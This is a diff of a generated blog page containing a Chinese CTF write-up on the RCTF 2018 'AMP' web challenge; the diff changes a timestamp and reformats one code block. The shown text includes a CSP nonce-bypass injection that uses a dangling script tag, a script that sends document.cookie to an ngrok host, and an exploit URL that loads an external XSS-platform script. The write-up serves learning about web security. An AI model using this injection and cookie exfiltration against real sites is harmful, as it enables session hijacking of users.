@@ -41,7 +41,7 @@
 <meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-15.png">
 <meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-16.png">
 <meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-17.png">
-<meta property="og:updated_time" content="2018-07-06T14:23:13.479Z">
+<meta property="og:updated_time" content="2018-07-06T14:24:15.325Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="它不是 XSS ——记 2018-RCTF一道WEB题：AMP | ——智齿——">
 <meta name="twitter:description" content="恰巧这一次的CTF还真没有关注，比赛完了之后，无意间看到了相关的writeup，大致浏览了下，觉得好像还是有点意思的，于是便趁着比赛环境还在，自己玩了玩。 打开题目地址http://amp.2018.teamrois.cn，可以看到以下这个页面，提示输入name作为请求参数。试着输入http://amp.2018.teamrois.cn/?name=123，传入name参数，可以看到以下返回。可以">
@@ -204,7 +204,9 @@ classes that you can use:
 &lt;script src=&quot;http://www.google.com/recaptcha/api.js&quot; nonce=&quot;1dda8fc2ac73eaeff4292117028b4562&quot;&gt;...&lt;/script&gt;
 </code></pre><p>我们可以在xss插入点，输入以下内容：</p>
 <pre><code>&lt;script src=&quot;http://xxx.xxx.xxx.xxx/test.js&quot; a=&quot;
-</code></pre><p>此时，页面就变为：<br>    <code>&lt;p&gt;&lt;script src=&quot;http://xxx.xxx.xxx.xxx/test.js&quot; a=&quot;&lt;/p&gt;&lt;script src=&quot;http://www.google.com/recaptcha/api.js&quot; nonce=&quot;1dda8fc2ac73eaeff4292117028b4562&quot;&gt;...&lt;/script&gt;</code><br>此时，我们可控的xss插入点已经包含了nonce字段值，进而绕过了CSP。<br>在本题中，我们使用xss平台构造，其中的自定义代码如下：<br><code>var img = document.createElement(&#39;img&#39;);
+</code></pre><p>此时，页面就变为：</p>
+<pre><code>&lt;p&gt;&lt;script src=&quot;http://xxx.xxx.xxx.xxx/test.js&quot; a=&quot;&lt;/p&gt;&lt;script src=&quot;http://www.google.com/recaptcha/api.js&quot; nonce=&quot;1dda8fc2ac73eaeff4292117028b4562&quot;&gt;...&lt;/script&gt;
+</code></pre><p>此时，我们可控的xss插入点已经包含了nonce字段值，进而绕过了CSP。<br>在本题中，我们使用xss平台构造，其中的自定义代码如下：<br><code>var img = document.createElement(&#39;img&#39;);
 img.src = &#39;http://ec492eb4.ngrok.io/flag=&#39;+encodeURIComponent(document.cookie);</code><br>创建一个img标签，在标签的src中将cookie值作为flag参数值，来访问本地的ngrox。</p>
 <p>我们构造的xss利用代码为：<br>    <a href="http://amp.2018.teamrois.cn/?name=" target="_blank" rel="noopener">http://amp.2018.teamrois.cn/?name=</a>&lt;script src=”<a href="https://xsspt.com/Ov7T0a?15283&quot;" target="_blank" rel="noopener">https://xsspt.com/Ov7T0a?15283&quot;</a> a=”<br>访问上述链接，发现并没有自己想的那么简单，获得到的仍然是提示，并不是真正的flag值。</p>
 <p>到这里，能想到的思路都试验了。回过头来发现这道题的题目是AMP,所以重新从AMP下手。</p>
